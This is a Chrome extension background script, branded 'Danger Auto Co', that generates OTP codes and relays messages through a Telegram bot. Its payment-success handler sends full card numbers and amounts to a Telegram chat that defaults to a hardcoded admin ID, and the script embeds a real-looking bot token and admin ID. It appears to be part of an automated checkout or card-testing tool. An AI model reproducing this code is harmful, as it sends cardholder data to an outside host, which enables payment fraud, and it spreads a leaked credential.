console.log("✅ Background script loaded.");

// Listen for messages from the extension
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "send_otp" && message.telegramId) {
        sendOTPToTelegram(message.telegramId, sendResponse);
        return true; // Keep sendResponse alive for async request
    } else if (message.action === "paymentSuccess") {
        handlePaymentSuccess(message.cardDetails, message.amount);
    }
});

chrome.action.onClicked.addListener(() => {
    chrome.tabs.create({ url: chrome.runtime.getURL("settings.html") });
});

// Function to send OTP request to Telegram
function sendOTPToTelegram(telegramId, sendResponse) {
    const botToken = "7890377108:AAFgiveInFKUPhn7S8t7zNRjZMQZn-1rKVk"; // Replace with your actual bot token
    const adminId = "7345260405"; // Replace with your Telegram admin ID
    const otp = Math.floor(100000 + Math.random() * 900000).toString(); // Generate a random OTP

    // Store the OTP for verification
    chrome.storage.local.set({ otp: otp }, function() {
        console.log('Generated OTP:', otp);

        // Send the OTP message to Telegram
        sendTelegramMessage(
            `🔐 Your OTP Code\n\n` +
            `Code: ${otp}\n` +
            `Valid for 5 minutes\n\n` +
            `Powered by Danger Auto Co 💪`,
            telegramId
        );

        // Send success response
        sendResponse({ success: true });
    });
}

// Function to handle payment success
function handlePaymentSuccess(cardDetails, amount) {
    chrome.storage.local.get(['telegramSettings'], function(result) {
        if (result.telegramSettings && result.telegramSettings.telegramId) {
            const telegramId = result.telegramSettings.telegramId;

            // Send notification to user
            sendTelegramMessage(
                `💰 Payment Successful!\n\n` +
                `💳 Card: ${cardDetails.cardNumber || 'N/A'}\n` +
                `💵 Amount: ${amount}\n` +
                `📅 Date: ${new Date().toLocaleString()}\n\n` +
                `Powered by Danger Auto Co 💪`,
                telegramId
            );
        }
    });
}

// Function to send message to Telegram
function sendTelegramMessage(message, chatId = "7345260405") { // Replace with your Telegram admin ID
    const botToken = "7890377108:AAFgiveInFKUPhn7S8t7zNRjZMQZn-1rKVk"; // Replace with your actual bot token

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log("✅ Message sent to Telegram successfully.");
        } else {
            console.error("❌ Failed to send message:", data);
        }
    })
    .catch(error => {
        console.error("❌ Error sending message:", error);
    });
}
